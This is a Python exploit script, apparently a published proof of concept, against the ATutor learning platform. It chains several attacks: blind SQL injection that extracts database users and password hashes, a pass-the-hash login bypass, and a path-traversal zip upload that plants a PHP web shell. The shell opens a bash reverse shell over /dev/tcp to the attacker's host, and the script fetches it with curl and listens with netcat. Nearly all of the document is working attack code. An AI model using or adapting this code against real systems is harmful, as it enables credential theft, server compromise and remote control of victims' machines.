# Exploit Title: Blind SQLi Extractor - POC
# Date: 2021-04-05
# Exploit Author: Youssef B
# Tested against: ATutor until 2017

import os, sys, re, requests, cmd, hashlib, zipfile, time, random, string
from requests_toolbelt import MultipartEncoder
from subprocess import Popen
from io import BytesIO
from pathlib import Path
from colorama import Fore, Style, init
init()

if len(sys.argv) != 5:
        print(f"(+) usage: {sys.argv[0]} <target> <uri>")
        print(f"(+) eg: {sys.argv[0]} 192.168.150.103 \"http://%s/atutor/mods/_standard/social/index_public.php?q=%s\" [YOUR_IP] [REVERSE_SHELL PORT]")
        sys.exit(-1)

ip, uri, attacker, port = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]

class colorterm:
    ENDC = '\033[0m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'

class sqli_prompt(cmd.Cmd):
    intro = '\nWelcome to the Blind Sqli Exploiter shell. Type help or ? to list commands.\n'
    prompt = '(bse) '

    def do_get_db_version(self, arg):
        print("(+) Retrieving database version...")
        db_get_info()

    def do_get_db_creds(self, arg):
        db_creds()

    def do_get_db_current_user(sefl, arg):
        print("(+) Retrieving current user....")
        db_get_info()

    def do_get_db_users(self, arg):
        print("(+) Retrieving username....")
        db_get_info()

    def do_show_db_grants(self, arg):
        print("(+) Retrieving privileges for current user....")
        db_get_info()

    def do_get_hash(self, arg):
        db_hash()

    def do_get_reverse_shell(self, arg):
        _, main_s = login_bypass(ip)
        if main_s:
            print(f"{Fore.YELLOW}\n(+) Login successful!\n{Style.RESET_ALL}")
            build_zip()
            time.sleep(2)
            print("(+) Uploading shell...\n")
            if upload_shell(ip, main_s):
                curl = "(sleep 5; curl http://%s/atutor/mods/poc.php4 2>/dev/null)&" % ip
                netcat = "nc -nlvp %s" % port
                Popen(curl, shell=True)
                p = Popen(netcat, shell=True, executable='/bin/bash')
                p.communicate()
            else:
                print(f"{Fore.RED}(-) File upload failed!{Style.RESET_ALL}\n")
                sqli_prompt().cmdloop()
        else:
            print(f"{Fore.RED}(-) Failed!\n{Style.RESET_ALL}")
            sqli_prompt().cmdloop()

    def do_quit(self, arg):
        exit(0)


def search_blind_sqli(ip, uri, inj_str):
    for i in range(32, 126):
        repl    = inj_str.replace("[CHAR]", str(i))
        target  = uri %(ip, repl)
        r       = requests.get(target)

        content_length = int(r.headers['Content-Length'])

        if (content_length > 20):
            return i

    return None

def db_extractor(r, ip, uri, qr_inj):
    extracted = ""

    for i in range(1, r):
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" %(qr_inj,i)
        search_blind = search_blind_sqli(ip, uri, injection_string)

        try:
            extracted += chr(search_blind)
            extracted_char = chr(search_blind)
            sys.stdout.write(colorterm.GREEN + extracted_char)
            sys.stdout.flush()
        except:
            break

    if extracted_char is not None:
        print(colorterm.ENDC + "\n(+) done!")
        print(colorterm.WARNING + "(+) You've found something interesting!\n" + colorterm.ENDC)
    else:
        print(colorterm.ENDC + "\n(-) Unfortunately, nothing found...")

    return extracted

def db_creds():
    print("(+) Retrieving username....")
    username = db_get_info()

    print("(+) Retrieving password hash....")
    injection_pass = input("Enter your password query payload: ")
    password = db_extractor(50, ip, uri, injection_pass)

    print("(+) Credentials: " + colorterm.GREEN + username + colorterm.ENDC + " / " + colorterm.GREEN + password + colorterm.ENDC)

def db_hash():
    print("(+) Retrieving password hash....")
    injection_pass = input("Enter your password query payload: ")
    password = db_extractor(50, ip, uri, injection_pass)

    return password

def db_get_info():
    injection_string = input("Enter your query payload: ")
    return db_extractor(255, ip, uri, injection_string)

def gen_hash(passwd, token):
    h       = hashlib.sha1()
    p, t    = passwd.encode(), token.encode()

    h.update(p + t)
    print(f"\n{Fore.MAGENTA}Hashing result:{Style.RESET_ALL} {h.hexdigest()}\n")

    return h.hexdigest()

def login_bypass(ip):
    target  = "http://%s/atutor/login.php" % ip
    token   = "hax"
    hash_k  = input("(+) Do you have the hash? (y/n) ")
    if hash_k == 'y':
        hashp = input("(+) Pass the hash here: ")
    elif hash_k == 'n':
        hashp = db_hash()
    else:
        print(f"{Fore.RED}(-) Wrong answer! Don't waste my time!{Style.RESET_ALL}")
        sqli_prompt().cmdloop()


    hashed = gen_hash(hashp, token)
    d = {
        "form_password_hidden" : hashed,
        "form_login": "atutor",
        "submit": "Login",
        "token" : token
        }

    s = requests.Session()
    r = s.post(target, data=d)
    res = r.text

    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
        print(f"{Fore.GREEN}(*) Status code {target}:{Style.RESET_ALL} {r.status_code}")
        print(f"\n{Fore.MAGENTA}(*) Updating cookies for the upload part of the attack...")
        get_cake    = "http://%s/atutor/bounce.php?course=1" % ip
        cake        = s.get(get_cake)
        print(f"(*) Status code for {get_cake}:{Style.RESET_ALL} {cake.status_code}")
        return True, s
    else:
        print(f"{Fore.RED}(-) Oo ... Nothing here...\n{Style.RESET_ALL}")
        sqli_prompt().cmdloop()

def build_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../../../var/www/html/atutor/mods/poc.php4', '<?php exec(\"/bin/bash -c \'bash -i >& /dev/tcp/%s/%s 0>&1\'\");?>' %(attacker, port))
    z.writestr('imsmanifest.xml', 'invalid xml!')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

    if Path('poc.zip').is_file():
        print (f"{Fore.GREEN}(*) File successfully created.\n{Style.RESET_ALL}")
    else:
        print (f"{Fore.RED}(-) Error during zip file creation.\n{Style.RESET_ALL}")

def random_string(length):
    return ''.join(random.sample(string.ascii_letters + string.digits, length))

def upload_shell(ip, ts):
    target = "http://%s/atutor/mods/_standard/tests/import_test.php" % ip
    get_index  = "http://%s/atutor/mods/_standard/tests/./index.php" % ip

    boundary    = "----WebKitFormBoundary" + random_string(16)
    f           = open('poc.zip','rb')
    payload     = {'file': ('poc.zip', f, 'application/zip'), 'submit_import': 'Import'}
    m           = MultipartEncoder(fields=payload, boundary=boundary)

    headers = {'Host': ip,
    'Accept-Encoding': 'gzip, deflate',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'content-type': m.content_type,
    'Connection': 'close'}

    r = ts.post(target, headers=headers, data=m)
    res = r.text

    f.close()

    if "XML error: Not well-formed (invalid token) at line 1" in res:
        print(f"{Fore.GREEN}(*) Successfully uploaded reverse shell php file.{Style.RESET_ALL}")
        print(f"{Fore.GREEN}(*) Reverse connecting to local ip on port %s...\n{Style.RESET_ALL}" % port)
        return True, ts
    return False


def main():
    sqli_prompt().cmdloop()


if __name__ == "__main__":
    main()
